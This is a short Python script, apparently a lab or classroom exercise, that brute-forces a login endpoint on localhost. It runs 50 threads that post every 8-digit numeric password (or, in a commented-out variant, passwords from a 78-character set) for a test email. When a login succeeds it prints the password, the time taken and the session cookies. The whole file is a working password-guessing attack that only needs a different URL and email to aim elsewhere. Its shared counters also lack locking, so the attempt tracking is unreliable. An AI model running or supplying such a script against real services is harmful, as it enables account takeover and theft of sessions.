import requests
import json
import threading
import time

num = 0
count = 0
found_password = False

def format_number(num):
    return '{:08d}'.format(num)
  
def base36encode(number):
    alphabet = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%&*()_+[]ç-?'
    if number == 0:
        return '0'
    base36 = ''
    while number:
        number, i = divmod(number, 78)
        base36 = alphabet[i] + base36
    return base36

url = 'http://localhost:3000/user/login'

email = 'teste@teste.com' #num
# email = 'teste1@teste.com' #alphanum

startT = time.time()
def do_request():
  global num, found_password, startT, count
  while not found_password:
    password = format_number(num) #NUM
    # password = base36encode(num).rjust(8, '0') #ALPHANUM
    print(password)
    data = json.dumps({"email":email,"password":password})
    headers = {'Content-Type': 'application/json', 'Accept': 'application/json'}
    response = requests.post(url, data = data, headers= headers)
    if response.status_code == 200:
      print('SENHA CORRETA: ', password)
      endT = time.time()
      print('TEMPO: ', endT - startT, ' segundos')
      print('ENCONTROU NA TENTAVIA: ', num)
      found_password = True  
      print(response.cookies)
    num += 1
    
threads = []

qnt = 50

for i in range(qnt):
  t = threading.Thread(target=do_request)
  t.daemon = True
  threads.append(t)

for i in range(qnt):
  threads[i].start()
  
for i in range(qnt):
  threads[i].join()

print(num, ' tentativas')